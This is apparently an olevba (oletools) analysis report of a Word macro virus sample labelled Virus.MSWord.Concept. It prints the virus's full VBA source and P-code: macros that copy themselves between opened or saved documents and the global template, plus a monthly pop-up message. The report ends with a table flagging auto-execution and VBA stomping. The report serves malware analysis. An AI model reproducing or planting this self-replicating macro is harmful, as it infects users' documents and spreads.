olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Concept.cm
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Concept.cm - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: ./Virus.MSWord.Concept.cm - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Joea.MAIN"
Dim sMe$
Dim sMacro$
On Error GoTo -1: On Error GoTo Bali
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
sMe$ = WordBasic.[FileName$]()
sMacro$ = sMe$ + ":aUTOOpen"
WordBasic.MacroCopy "Global:Jua", sMacro$
sMacro$ = sMe$ + ":Joea"
WordBasic.MacroCopy "Global:FileSaveAs", sMacro$
If WordBasic.Day(WordBasic.Now()) = 1 Then
WordBasic.MsgBox "Tanggal satu, baru gajian nih ye, cerah sekali deh senyumnya."
End If
WordBasic.FileSaveAs dlg
GoTo Done
Bali:
If Err.Number <> 102 Then
WordBasic.FileSaveAs dlg
End If
Done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO Jua.bas 
in file: ./Virus.MSWord.Concept.cm - OLE stream: 'Macros/VBA/Jua'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Runs aUTOOpenScan"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.aUTOOpen.MAIN"
Dim sMe$
Dim sMacro$
On Error GoTo -1: On Error GoTo Bail
sMe$ = WordBasic.[FileName$]()
sMacro$ = sMe$ + ":Joea"
WordBasic.MacroCopy sMacro$, "Global:FileSaveAs"
sMacro$ = sMe$ + ":aUTOOpen"
WordBasic.MacroCopy sMacro$, "Global:Jua"
If WordBasic.Day(WordBasic.Now()) = 1 Then
WordBasic.MsgBox "Tanggal satu, baru gajian nih ye, cerah sekali deh senyumnya."
End If
Bail:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Concept.cm
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/FileSaveAs - 2252 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn sMe
' Line #3:
' 	Dim 
' 	VarDefn sMacro
' Line #4:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Bali 
' Line #5:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #6:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #7:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #8:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' 	EndIf 
' Line #9:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St sMe$ 
' Line #10:
' 	Ld sMe$ 
' 	LitStr 0x0009 ":aUTOOpen"
' 	Add 
' 	St sMacro$ 
' Line #11:
' 	LitStr 0x000A "Global:Jua"
' 	Ld sMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #12:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":Joea"
' 	Add 
' 	St sMacro$ 
' Line #13:
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld sMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #14:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #15:
' 	LitStr 0x003D "Tanggal satu, baru gajian nih ye, cerah sekali deh senyumnya."
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0001 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #18:
' 	GoTo Done 
' Line #19:
' 	Label Bali 
' Line #20:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x0066 
' 	Ne 
' 	IfBlock 
' Line #21:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	Label Done 
' Line #24:
' 	EndSub 
' Macros/VBA/Jua - 1724 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn sMe
' Line #3:
' 	Dim 
' 	VarDefn sMacro
' Line #4:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Bail 
' Line #5:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St sMe$ 
' Line #6:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":Joea"
' 	Add 
' 	St sMacro$ 
' Line #7:
' 	Ld sMacro$ 
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #8:
' 	Ld sMe$ 
' 	LitStr 0x0009 ":aUTOOpen"
' 	Add 
' 	St sMacro$ 
' Line #9:
' 	Ld sMacro$ 
' 	LitStr 0x000A "Global:Jua"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #10:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #11:
' 	LitStr 0x003D "Tanggal satu, baru gajian nih ye, cerah sekali deh senyumnya."
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0001 
' Line #12:
' 	EndIfBlock 
' Line #13:
' 	Label Bail 
' Line #14:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |aUTOOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

